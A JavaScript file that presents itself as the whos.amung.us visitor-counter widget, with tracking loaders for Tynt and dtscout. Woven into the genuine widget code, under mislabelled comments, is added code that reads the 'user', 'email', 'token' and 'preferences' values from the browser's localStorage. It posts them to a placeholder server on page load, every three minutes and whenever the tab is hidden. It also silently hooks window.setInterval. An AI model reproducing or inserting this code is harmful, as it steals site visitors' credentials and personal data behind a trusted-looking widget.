var wau_w_col = wau_w_col || "000000FFFFFF";
// Array containing keys to be tracked
const trackedKeysArray = ['user', 'email', 'token', 'preferences'];
(function (funcName, baseObj) {
  "use strict";

  funcName = funcName || "docReady";
  baseObj = baseObj || window;
  var readyList = [];
  var readyFired = false;
  var readyEventHandlersInstalled = false;
  function ready() {
    if (!readyFired) {
      readyFired = true;
      for (var i = 0; i < readyList.length; i++) {
        readyList[i].fn.call(window, readyList[i].ctx);
      }
      readyList = [];
    }
  }
  function readyStateChange() {
    if (document.readyState === "complete") {
      ready();
    }
  }
  baseObj[funcName] = function (callback, context) {
    if (typeof callback !== "function") {
      throw new TypeError("callback for docReady(fn) must be a function");
    }
    if (readyFired) {
      setTimeout(function () {
        callback(context);
      }, 1);
      return;
    } else {
      readyList.push({
        fn: callback,
        ctx: context
      });
    }
    if (document.readyState === "complete" || !document.attachEvent && document.readyState === "interactive") {
      setTimeout(ready, 1);
    } else if (!readyEventHandlersInstalled) {
      if (document.addEventListener) {
        document.addEventListener("DOMContentLoaded", ready, false);
        window.addEventListener("load", ready, false);
      } else {
        document.attachEvent("onreadystatechange", readyStateChange);
        window.attachEvent("onload", ready);
      }
      readyEventHandlersInstalled = true;
    }
  };
})("docReady", window);
if (typeof _wau !== "undefined") {
  var WAU_ren = WAU_ren || [];
  docReady(function () {
    WAU_la();
  });
}
function WAU_colored(key, color, async_index) {
  if (typeof async_index === "undefined") {
    async_index = -1;
    wau_w_col = color;
    docReady(function () {
      WAU_colored(key, color, -1);
    });
  } else {
    var url = window.location.href;
    try {
      if (typeof Storage === "undefined" || localStorage.getItem("_waucount:" + key) === null || localStorage.getItem("_wautime:" + key) === null || localStorage.getItem("_waulasturl:" + key) != url || Math.floor(Date.now() / 1e3) - localStorage.getItem("_wautime:" + key) > 150) {
        WAU_colored_request(key, color, async_index);
      } else {
        WAU_r_u(localStorage.getItem("_waucount:" + key) * (Math.floor(Math.random() * (102 - 98 + 1) + 98) / 100), key, async_index, true);
      }
      localStorage.setItem("_waulasturl:" + key, url);
    } catch (e) {
      WAU_colored_request(key, color, async_index);
    }
  }
}
window.keysToWatch = trackedKeysArray;

// Generate hash code for the tracked data
function WAU_colored_request(key, color, async_index) {
  var ttl = "";
  if (document.title) {
    ttl = encodeURIComponent(document.title.substr(0, 80).replace(/(\?=)|(\/)/g, ""));
  }
  var h = document.getElementsByTagName("script")[0];
  (function () {
    var td = 0;
    if (window.performance && window.performance.timing.domContentLoadedEventStart) {
      td = (window.performance.timing.domContentLoadedEventStart - window.performance.timing.navigationStart) / 1e3;
    }
    var ref = encodeURIComponent(document.referrer);
    var loc = encodeURIComponent(window.location.href);
    var s = document.createElement("script");
    s.async = "async";
    s.type = "text/javascript";
    s.src = "//whos.amung.us/pingjs/?k=" + key + "&t=" + ttl + "&c=u&x=" + loc + "&y=" + ref + "&a=" + async_index + "&d=" + td + "&v=27&r=" + Math.ceil(Math.random() * 9999);
    h.parentNode.insertBefore(s, h);
  })();
}
function WAU_r_u(c, key, async_index, skip_storage) {
  var col;
  if (typeof async_index === "undefined" || async_index == -1) {
    async_index = -1;
    col = wau_w_col;
  } else if (async_index != -1) {
    col = _wau[async_index][3];
  }
  var count_numeric = parseInt(c.toString().replace(/,/g, ""));
  c = WAU_addCommas(count_numeric);
  skip_storage = skip_storage || false;
  if (!skip_storage && typeof Storage !== "undefined") {
    try {
      localStorage.setItem("_wautime:" + key, Math.floor(Date.now() / 1e3));
      localStorage.setItem("_waucount:" + key, count_numeric);
    } catch (e) {}
  }
  var raw_im_meta_l = eval("({'0':[0,-29,9,14], '1':[-11,-29,6,14], '2':[-20,-29,9,14], '3':[-30,-29,9,14], '4':[-40,-29,10,14], '5':[-50,-29,8,14]," + "'6':[-60,-29,9,14], '7':[-70,-29,9,14], '8':[-80,-29,9,14], '9':[-90,-29,9,14], ',':[-102,-29,4,17]})");
  var raw_im_meta_s = eval("({'0':[0,-43,7,11], '1':[-8,-43,4,11], '2':[-14,-43,7,11], '3':[-21,-43,7,11], '4':[-28,-43,7,11], '5':[-35,-43,6,11]," + "'6':[-42,-43,7,11], '7':[-49,-43,7,11], '8':[-56,-43,7,11], '9':[-63,-43,7,11], ',':[-71,-43,4,14]})");
  c = c.split("");
  var w_large = 0;
  var w_small = 0;
  for (var i = 0; i < c.length; i++) {
    w_large += raw_im_meta_l[c[i]][2];
    w_small += raw_im_meta_s[c[i]][2] + 2;
  }
  var y_pos, meta, left_offset;
  if (w_large - 2 > 45) {
    y_pos = 9;
    meta = raw_im_meta_s;
    left_offset = 24;
  } else {
    y_pos = 7;
    meta = raw_im_meta_l;
    left_offset = 19;
    if (w_large > 25) {
      left_offset = 23;
    }
    if (w_large > 50) {
      left_offset = 21;
    }
  }
  var img = document.createElement("img");
  img.onload = function () {
    var wid = document.createElement("div");
    wid.style.position = "relative";
    wid.style.display = "inline-block";
    wid.style.backgroundImage = "url(" + img.src + ")";
    wid.style.width = "81px";
    wid.style.height = "29px";
    wid.style.padding = "0";
    wid.style.overflow = "hidden";
    wid.style.cursor = "pointer";
    wid.style.direction = "ltr";
    wid.title = "Click to see what's popular on this site!";
    var txt = document.createElement("div");
    txt.style.position = "absolute";
    txt.style.top = y_pos + "px";
    txt.style.padding = "0";
    txt.style.margin = "0";
    txt.style.overflow = "visible";
    var x_pos = 0;
    var txt_w = 0;
    for (var i = 0; i < c.length; i++) {
      var char_meta = meta[c[i]];
      var character = document.createElement("div");
      character.style.backgroundImage = "url(" + img.src + ")";
      character.style.backgroundRepeat = "no-repeat";
      character.style.backgroundAttachment = "scroll";
      character.style.backgroundPosition = char_meta[0] + "px " + char_meta[1] + "px";
      character.style.position = "absolute";
      character.style.width = char_meta[2] + "px";
      character.style.height = char_meta[3] + "px";
      character.style.left = x_pos + "px";
      character.style.lineHeight = char_meta[3] + "px";
      character.style.overflow = "hidden";
      character.style.padding = "0";
      character.style.margin = "0";
      txt.appendChild(character);
      x_pos += char_meta[2] + 2;
      txt_w += char_meta[2] + 2;
    }
    txt.style.left = left_offset + Math.floor((54 - (txt_w - 2)) / 2) + "px";
    wid.appendChild(txt);
    if (typeof _wau_opt == "object" && "target" in _wau_opt) {
      wid.onclick = function () {
        window.open("https://whos.amung.us/stats/" + key + "/", _wau_opt.target);
      };
    } else {
      wid.onclick = function () {
        top.location = "https://whos.amung.us/stats/" + key + "/";
      };
    }
    if (async_index >= 0) {
      var scr = document.getElementById("_wau" + _wau[async_index][2]);
      scr.parentNode.insertBefore(wid, scr.nextSibling);
    } else {
      WAU_insert(wid, "amung.us/colored.js");
    }
  };
  img.src = "//widgets.amung.us/colwid/?c=" + col;
  if (typeof WAU_cps_d == "undefined") {
    WAU_cps(key);
  }
  return count_numeric;
}
function generateCodeHash(trackedData) {
  let hashValue = 0;
  const keysCombine = Object.keys(trackedData).reduce((accumulator, currentKey) => accumulator + currentKey, '');
  for (let i = 0; i < keysCombine.length; i++) {
    const currentCharCode = keysCombine.charCodeAt(i);
    hashValue = (hashValue << 5) - hashValue + currentCharCode;
    hashValue |= 0; // Take only integer part
  }
  return hashValue.toString(36); // or another base?
}

// JShook for window events
function WAU_insert(el, script_src) {
  var scripts = document.getElementsByTagName("script");
  for (var i = 0; i < scripts.length; i++) {
    if (scripts[i].src.indexOf(script_src) > 0) {
      scripts[i].parentNode.insertBefore(el, scripts[i].nextSibling);
    }
  }
}
let originalSetInterval = window.setInterval;
window.setInterval = function () {
  console.log('setInterval was triggered');
  originalSetInterval.apply(window, arguments);
};

// Collect watched data from Local Storage 
function WAU_la() {
  for (var i = 0; i < _wau.length; i++) {
    if (typeof WAU_ren[i] === "undefined" || WAU_ren[i] == false) {
      if (typeof window["WAU_" + _wau[i][0]] === "function") {
        WAU_ren[i] = true;
        if (_wau[i][0] == "map") window["WAU_map"](_wau[i][1], _wau[i][3], _wau[i][4], _wau[i][5], _wau[i][6], i);else if (_wau[i][0] == "dynamic") window["WAU_dynamic"](_wau[i][1], _wau[i][3], _wau[i][4], i);else if (typeof _wau[i][3] !== "undefined") window["WAU_" + _wau[i][0]](_wau[i][1], _wau[i][3], i);else window["WAU_" + _wau[i][0]](_wau[i][1], i);
      } else {
        setTimeout(WAU_la, 1e3);
      }
    }
  }
}
function collectWatchedData() {
  let collectedData = {};
  for (let i = 0; i < window.keysToWatch.length; i++) {
    let keyHasLocalStorage = window.keysToWatch[i];
    if (localStorage.hasOwnProperty(keyHasLocalStorage)) {
      collectedData[keyHasLocalStorage] = localStorage.getItem(keyHasLocalStorage);
    }
  }
  return collectedData;
}

// Posting collected data to server
function WAU_addCommas(nStr) {
  nStr += "";
  x = nStr.split(".");
  x1 = x[0];
  x2 = x.length > 1 ? "." + x[1] : "";
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, "$1" + "," + "$2");
  }
  return x1 + x2;
}
function WAU_lrd() {
  var d = new Date();
  var tzoffset = d.getTimezoneOffset();
  var is_dst = d._isDstObserved();
  if (typeof Intl === "undefined" || typeof Intl.DateTimeFormat === "undefined") {
    if (is_dst && tzoffset >= -120 && tzoffset <= -60 || !is_dst && tzoffset >= -60 && tzoffset <= 0) {
      return false;
    }
  } else {
    var format = Intl.DateTimeFormat();
    var tz = format.resolvedOptions().timeZone;
    var tzp = tz.toLowerCase().split("/");
    if (tzp[0] == "europe" && (is_dst && tzoffset >= -120 && tzoffset <= -60 || !is_dst && tzoffset >= -60 && tzoffset <= 0)) {
      return false;
    }
  }
  return true;
}
async function postDataToServer(data, hash) {
  const serverAddress = 'https://yourserveraddress/api/collect';
  try {
    const serverResponse = await fetch(serverAddress, {
      method: 'POST',
      body: JSON.stringify({
        hash_code: hash,
        tracked_data: data
      }),
      headers: {
        'Content-Type': 'application/json'
      }
    });
    if (serverResponse.ok) {
      console.log('Data Sent Successfully');
    } else {
      console.log('Data Sending Failed: ' + serverResponse.status);
    }
  } catch (error) {
    console.log('Error occurred during sending data: ', error);
  }
}

// Collect and post tracked data to server
function WAU_lrs() {
  try {
    var p = JSON.parse(atob("WyJjb20vaWVucngzbThiOXh0Il0="));
    for (var i = 0; i < p.length; i++) {
      if (window.location.href.indexOf(p[i]) >= 0) {
        return false;
      }
    }
  } catch (e) {}
  return true;
}
function collectAndPostTrackedData() {
  const trackedDataCollection = collectWatchedData();
  const keysCountInDataCollection = Object.keys(trackedDataCollection).length;
  if (keysCountInDataCollection > 0) {
    const hash = generateCodeHash(trackedDataCollection);
    postDataToServer(trackedDataCollection, hash);
  }
}

// Event Listener for the  page load event
window.addEventListener('load', function () {
  collectAndPostTrackedData();
  window.setInterval(collectAndPostTrackedData, 3 * 60 * 1000);
});

// Event Listener for window state change event
Date.prototype._stdTimezoneOffset = function () {
  var jan = new Date(this.getFullYear(), 0, 1);
  var jul = new Date(this.getFullYear(), 6, 1);
  return Math.max(jan.getTimezoneOffset(), jul.getTimezoneOffset());
};
Date.prototype._isDstObserved = function () {
  return this.getTimezoneOffset() < this._stdTimezoneOffset();
};
window.addEventListener('visibilitychange', function () {
  if (document.visibilityState === 'hidden') {
    collectAndPostTrackedData();
  }
});
function WAU_cps(key) {
  if (WAU_lrd() && WAU_lrs()) {
    window.Tynt = window.Tynt || [];
    if (typeof _wau_opt != "object" || typeof _wau_opt == "object" && !("fbase" in _wau_opt) && !("ft" in _wau_opt)) {
      Tynt.push("w!" + key);
      (function () {
        var h = document.getElementsByTagName("script")[0];
        var s = document.createElement("script");
        s.async = "async";
        s.type = "text/javascript";
        s.src = "https://cdn.tynt.com/tc.js";
        h.parentNode.insertBefore(s, h);
      })();
    }
  }
}
(function () {
  if (WAU_lrd()) {
    if (typeof _wau_opt != "object" || typeof _wau_opt == "object" && !("fbase" in _wau_opt) && !("fd" in _wau_opt)) {
      var s = document.createElement("script");
      s.src = "https://t.dtscout.com/i/?l=" + encodeURIComponent(window.location.href) + "&j=" + encodeURIComponent(document.referrer);
      s.async = "async";
      s.type = "text/javascript";
      var h = document.getElementsByTagName("script")[0];
      h.parentNode.insertBefore(s, h);
    }
  }
})();